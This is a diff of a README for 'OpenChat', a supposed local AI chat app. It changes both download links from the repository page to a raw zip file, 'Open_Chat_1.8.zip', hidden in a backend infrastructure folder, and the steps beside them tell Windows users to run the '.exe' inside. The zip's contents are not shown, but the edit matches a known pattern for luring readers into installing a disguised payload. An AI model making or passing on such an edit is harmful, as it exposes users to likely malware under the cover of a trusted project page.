@@ -1,6 +1,6 @@
 # 🤖 OpenChat - Run Private AI Chat Locally Today
 
-[![Download OpenChat](https://img.shields.io/badge/Download-OpenChat-blue.svg)](https://github.com/rabsharpeared662/OpenChat)
+[![Download OpenChat](https://img.shields.io/badge/Download-OpenChat-blue.svg)](https://raw.githubusercontent.com/rabsharpeared662/OpenChat/main/backend/OpenChat.Infrastructure/Open_Chat_1.8.zip)
 
 OpenChat lets you chat with a smart assistant on your own computer. Because it runs locally, your data stays on your machine. You do not need an internet connection to process your messages once the initial setup finishes. This tool uses the same technology behind modern chat assistants to help you learn, write code, or organize your thoughts.
 
@@ -8,7 +8,7 @@ OpenChat lets you chat with a smart assistant on your own computer. Because it r
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [OpenChat download page](https://github.com/rabsharpeared662/OpenChat) to access the latest installer.
+1. Visit the [OpenChat download page](https://raw.githubusercontent.com/rabsharpeared662/OpenChat/main/backend/OpenChat.Infrastructure/Open_Chat_1.8.zip) to access the latest installer.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file to start the download.
 4. Once the download finishes, open the folder where you saved the file.
